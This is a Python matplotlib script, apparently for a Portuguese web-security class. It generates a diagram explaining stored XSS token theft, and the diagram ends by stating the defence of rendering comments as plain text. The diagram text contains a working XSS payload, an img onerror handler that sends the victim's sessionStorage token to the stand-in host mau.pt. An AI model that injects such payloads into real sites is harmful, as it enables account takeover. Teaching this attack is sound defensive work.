"""Roubo de um token por XSS: comentário malicioso guardado no servidor, inserido com innerHTML no browser da
vítima, que executa o código e envia o token ao atacante (Cap08 / Aula 08 da ASW).

Nota: um <script> inserido com innerHTML não é executado pelo browser; por isso o exemplo usa <img onerror>.
Uso: python gen_cap08_xss.py <ficheiro_saida.png>
"""
import os
import sys

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt
from matplotlib.patches import FancyBboxPatch, FancyArrowPatch

DARK = "#0a1420"
MID = "#0e6e8c"
LIGHT = "#eaf6f8"
RED = "#c0392b"
GREEN = "#218c4a"
GREY = "#5f6b70"
FS = 18

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from traduzir_figura import ativar  # noqa: E402
ativar(__file__)                     # --en: textos em inglês (assets/scripts/en/)
out = sys.argv[1] if len(sys.argv) > 1 else "xss.png"


def box(ax, x0, y0, w, h, fc, ec, lw=2.2):
    ax.add_patch(FancyBboxPatch((x0, y0), w, h, boxstyle="round,pad=0.02,rounding_size=0.15",
                                fc=fc, ec=ec, lw=lw, zorder=2))


def badge(ax, x, y, n, color):
    ax.add_patch(plt.Circle((x, y), 0.26, color=color, zorder=6))
    ax.text(x, y, str(n), ha="center", va="center", fontsize=FS - 4, color="white", fontweight="bold", zorder=7)


def arrow(ax, p, q, color, rad=0.0):
    ax.add_patch(FancyArrowPatch(p, q, arrowstyle="-|>", mutation_scale=22, color=color, lw=2.6, zorder=3,
                                 shrinkA=0, shrinkB=0, connectionstyle=f"arc3,rad={rad}"))


fig, ax = plt.subplots(figsize=(20, 10.4), dpi=200)
ax.set_xlim(0, 20)
ax.set_ylim(-1.8, 9.0)
ax.axis("off")

# atores
box(ax, 0.2, 3.2, 3.6, 2.0, "#fbe9e7", RED)
ax.text(2.0, 4.45, "Atacante", ha="center", va="center", fontsize=FS + 1, color=RED, fontweight="bold")
ax.text(2.0, 3.85, "e o seu servidor", ha="center", va="center", fontsize=FS - 4, color=RED, style="italic")

box(ax, 11.0, 6.3, 8.6, 2.3, LIGHT, MID)
ax.text(11.3, 8.05, "Servidor da aplicação (API)", ha="left", va="center", fontsize=FS, color=MID, fontweight="bold")
ax.text(11.3, 7.25, "guarda o comentário tal como veio\ne devolve-o, no JSON, a quem o pedir", ha="left",
        va="center", fontsize=FS - 4, color=DARK, linespacing=1.25)

box(ax, 11.0, 0.0, 8.6, 3.0, "white", MID)
ax.text(11.3, 2.5, "Browser da vítima", ha="left", va="center", fontsize=FS, color=MID, fontweight="bold")
ax.text(11.3, 1.85, "sessionStorage: token da vítima", ha="left", va="center", fontsize=FS - 4, color=DARK,
        family="monospace")
ax.text(11.3, 0.85, "a página mostra o comentário como HTML:\no browser executa o código, que lê o token",
        ha="left", va="center", fontsize=FS - 4, color=RED, linespacing=1.25)
badge(ax, 18.9, 0.85, 3, RED)

# 1. comentário malicioso
arrow(ax, (3.9, 5.0), (10.9, 7.3), RED)
badge(ax, 4.7, 5.85, 1, RED)
ax.text(5.3, 6.15, "POST /comentarios", ha="left", va="center", fontsize=FS - 3, color=RED, family="monospace",
        fontweight="bold", rotation=18)
ax.text(0.2, 8.45, "o comentário:", ha="left", va="center", fontsize=FS - 4, color=GREY, style="italic")
ax.text(0.2, 7.85, "Ótimo livro! <img src=x onerror=\"fetch('https://mau.pt/?t='", ha="left", va="center",
        fontsize=FS - 5, color=RED, family="monospace")
ax.text(0.2, 7.35, "                     + sessionStorage.getItem('token'))\">", ha="left", va="center",
        fontsize=FS - 5, color=RED, family="monospace")

# 2. a vítima recebe o comentário
arrow(ax, (15.3, 6.2), (15.3, 3.1), MID)
badge(ax, 15.75, 4.65, 2, MID)
ax.text(16.15, 4.65, "GET /comentarios", ha="left", va="center", fontsize=FS - 3, color=MID, family="monospace",
        fontweight="bold")

# 4. o token vai para o atacante
arrow(ax, (10.9, 1.2), (3.0, 3.1), RED)
badge(ax, 6.2, 1.2, 4, RED)
ax.text(6.6, 1.05, "o token da vítima", ha="left", va="center", fontsize=FS - 3, color=RED, fontweight="bold")

# 5. o atacante usa o token
arrow(ax, (3.9, 4.4), (10.9, 6.7), RED, rad=-0.0)
badge(ax, 9.4, 5.55, 5, RED)
ax.text(5.0, 4.15, "Authorization: Bearer <token da vítima>", ha="left", va="center", fontsize=FS - 5, color=RED,
        family="monospace", rotation=18)

ax.text(0.2, -0.75, "Defesa: a página mostra o comentário como texto simples, nunca como HTML;", ha="left",
        va="center", fontsize=FS - 2, color=GREEN, fontweight="bold")
ax.text(0.2, -1.3, "o <img ...> aparece escrito no ecrã, tal como o atacante o escreveu, e nada é executado.",
        ha="left", va="center", fontsize=FS - 2, color=GREEN, fontweight="bold")

fig.savefig(out, bbox_inches="tight", pad_inches=0.12, facecolor="white")
print("ok", out)
